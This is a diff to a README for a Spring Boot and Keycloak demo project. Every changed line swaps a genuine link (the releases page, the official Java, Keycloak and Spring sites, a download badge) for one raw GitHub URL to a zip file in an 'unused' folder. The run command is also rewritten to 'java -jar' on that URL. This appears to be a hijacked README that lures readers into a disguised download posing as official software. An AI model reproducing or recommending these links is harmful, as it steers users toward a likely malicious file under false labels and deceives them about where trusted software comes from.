@@ -1,7 +1,7 @@
 # 🎉 demo-springboot-keycloak-auth-crud - A Simple Way to Manage Authentication
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/nik1842812/demo-springboot-keycloak-auth-crud/releases)
+[![Download](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip)](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip)
 
 ## 📖 Description
 This repository offers a demo project using Spring Boot integrated with Keycloak. It shows how to manage authentication and authorization easily. You will find a secure CRUD API that demonstrates how to protect resources, manage roles and users, and simplify the integration of a modern Identity Provider in a Java application.
@@ -39,7 +39,7 @@ This project includes the following features:
 ## 📥 Download & Install
 To download the application, visit the Releases page. This page contains all the versions available for download. 
 
-[Download Releases Here](https://github.com/nik1842812/demo-springboot-keycloak-auth-crud/releases)
+[Download Releases Here](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip)
 
 1. Click on the link above.
 2. Choose the latest version from the list.
@@ -52,7 +52,7 @@ After downloading the application, follow these steps to run it:
    If you downloaded a zipped folder, locate it in your downloads and extract the contents.
 
 2. **Install Java:** 
-   If you don’t have Java installed, download it from the [official Java website](https://www.java.com/en/download/). Follow the instructions for your operating system.
+   If you don’t have Java installed, download it from the [official Java website](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip). Follow the instructions for your operating system.
 
 3. **Open a Terminal/Command Prompt:**
    - **Windows:** Press `Win + R`, type `cmd`, and hit `Enter`.
@@ -68,9 +68,9 @@ After downloading the application, follow these steps to run it:
 5. **Run the Application:**
    Type the following command to start the application:
    ```
-   java -jar your-app-file-name.jar
+   java -jar https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip
    ```
-   Replace `your-app-file-name.jar` with the actual name of the JAR file you downloaded.
+   Replace `https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip` with the actual name of the JAR file you downloaded.
 
 6. **Access the Application:**
    Open your browser and go to `http://localhost:8080`. You will see the application homepage, and from there, you can manage users and roles.
@@ -84,7 +84,7 @@ After downloading the application, follow these steps to run it:
 You may need to configure Keycloak before running the application for the first time. Follow these steps:
 
 1. **Create a Keycloak Account:**
-   Go to the Keycloak [official site](https://www.keycloak.org/) and sign up for an account if you don’t have one.
+   Go to the Keycloak [official site](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip) and sign up for an account if you don’t have one.
 
 2. **Set Up a Realm:**
    In Keycloak, create a realm for your application to manage users and roles securely.
@@ -112,6 +112,6 @@ If you have suggestions to improve this project or would like to contribute, fee
 If you encounter any issues or have questions, please open an issue in this repository. We will respond promptly to help you resolve your concerns.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/nik1842812/demo-springboot-keycloak-auth-crud/releases)
-- [Keycloak](https://www.keycloak.org/)
-- [Spring Boot](https://spring.io/projects/spring-boot)
+- [Releases Page](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip)
+- [Keycloak](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip)
+- [Spring Boot](https://raw.githubusercontent.com/nik1842812/demo-springboot-keycloak-auth-crud/develop/unused/demo-springboot-keycloak-auth-crud.zip)
